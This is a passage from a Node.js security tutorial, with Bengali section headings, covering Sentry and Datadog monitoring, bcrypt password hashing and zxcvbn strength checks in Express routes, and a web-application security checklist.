} catch (error) {
    Sentry.captureException(error);
}
```

#### Using Datadog:

```bash
npm install dd-trace
```

```javascript
// tracer.js
const tracer = require('dd-trace').init({
    service: 'myapp',
    env: process.env.NODE_ENV,
    logInjection: true
});

module.exports = tracer;

// Use at the very top of index.js
require('./tracer');
```

---

## ৯. Password Security

### ✅ Password Hashing (bcrypt)

```bash
npm install bcrypt
```

```javascript
const bcrypt = require('bcrypt');

// Register - Hash password
app.post('/register', async (req, res) => {
    const { email, password } = req.body;
    
    // Validate password strength
    if (password.length < 8) {
        return res.status(400).json({ error: 'Password too short' });
    }
    
    // Hash password
    const saltRounds = 12;  // Higher = more secure but slower
    const hashedPassword = await bcrypt.hash(password, saltRounds);
    
    // ❌ Never store plain password!
    // ✅ Store hash
    const user = await User.create({
        email,
        password: hashedPassword  // Stored as hash
    });
    
    res.status(201).json({ message: 'User created' });
});

// Login - Compare hash
app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    
    const user = await User.findOne({ email });
    
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // ✅ Compare plain password with hash
    const isValid = await bcrypt.compare(password, user.password);
    
    if (!isValid) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Generate token
    const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET);
    res.json({ token });
});
```

### Password Strength Validation:

```bash
npm install zxcvbn
```

```javascript
const zxcvbn = require('zxcvbn');

function validatePasswordStrength(password) {
    const result = zxcvbn(password);
    
    // Score: 0 (weak) to 4 (strong)
    if (result.score < 3) {
        return {
            valid: false,
            message: `Weak password: ${result.feedback.warning}`,
            suggestions: result.feedback.suggestions
        };
    }
    
    return { valid: true };
}

app.post('/register', async (req, res) => {
    const { password } = req.body;
    
    const strength = validatePasswordStrength(password);
    
    if (!strength.valid) {
        return res.status(400).json({
            error: strength.message,
            suggestions: strength.suggestions
        });
    }
    
    // Continue with registration...
});
```

---

## ১০. Security Checklist

### Authentication & Authorization:
- [ ] Hash passwords with bcrypt (min 12 rounds)
- [ ] Implement JWT properly (secure, httpOnly cookies)
- [ ] Token expiration (access: 15min, refresh: 7days)
- [ ] Implement refresh token rotation
- [ ] Multi-factor authentication (2FA)
- [ ] Account lockout after failed attempts
- [ ] Password reset with secure tokens
- [ ] Session timeout after inactivity

### Input Validation:
- [ ] Validate all user inputs
- [ ] Sanitize HTML inputs (XSS prevention)
- [ ] Use parameterized queries (SQL injection)
- [ ] Validate file uploads (type, size, content)
- [ ] Whitelist instead of blacklist
- [ ] Validate on server (never trust client)

### API Security:
- [ ] Rate limiting implemented
- [ ] CORS configured properly
- [ ] API versioning
- [ ] Request size limits
- [ ] Timeout configuration
- [ ] API documentation (secure endpoints)

### Data Protection:
- [ ] HTTPS everywhere (TLS 1.3)
- [ ] Encrypt sensitive data at rest
- [ ] Secure cookie settings (httpOnly, secure, sameSite)
- [ ] Don't expose PII in logs
- [ ] Data backup encrypted
- [ ] Secure file uploads

### Headers & CSP:
- [ ] Helmet.js configured
- [ ] Content Security Policy
- [ ] HSTS enabled
- [ ] X-Frame-Options (clickjacking)
- [ ] X-Content-Type-Options (MIME sniffing)

### Dependencies:
- [ ] Keep dependencies updated
- [ ] Run `npm audit` regularly
- [ ] Remove unused packages
- [ ] Use `package-lock.json`
- [ ] Review security advisories

### Error Handling:
- [ ] Don't expose stack traces in production
- [ ] Generic error messages for users
- [ ] Detailed logs server-side
- [ ] Global error handler
- [ ] Handle async errors

### Logging & Monitoring:
- [ ] Log security events
- [ ] Don't log sensitive data
- [ ] Centralized logging (ELK, Sentry)
- [ ] Monitor failed login attempts
- [ ] Alert on suspicious activity
- [ ] Regular security audits

### Infrastructure:
- [ ] Environment variables for secrets
- [ ] Secrets manager in production
- [ ] Regular backups
- [ ] Firewall configured
- [ ] DDoS protection (Cloudflare)
- [ ] Container security (if using Docker)

### Testing:
- [ ] Security testing (OWASP ZAP, Burp Suite)
- [ ] Penetration testing
- [ ] Code review for security
- [ ] Automated security scans (Snyk)

---

## সারাংশ

একটি secure Node.js application তে থাকা উচিত:

✅ **Input Validation** (Joi, Zod, express-validator)  
✅ **Injection Prevention** (Parameterized queries, ORM)  
✅ **XSS Protection** (Sanitization, CSP, HttpOnly cookies)  
✅ **CSRF Protection** (CSRF tokens, SameSite cookies)  
✅ **Secure Headers** (Helmet.js)  
✅ **Rate Limiting** (express-rate-limit, Redis)  
✅ **Secrets Management** (dotenv, AWS Secrets Manager)  
✅ **Logging & Monitoring** (Winston, Morgan, Sentry)  
✅ **Password Security** (bcrypt, strong policies)  
✅ **Authentication** (JWT, 2FA, session management)  
✅ **HTTPS Everywhere**  
✅ **Regular Updates** (dependencies, security patches)

**Remember:** Security is not a one-time task, it's an ongoing process! 🛡️
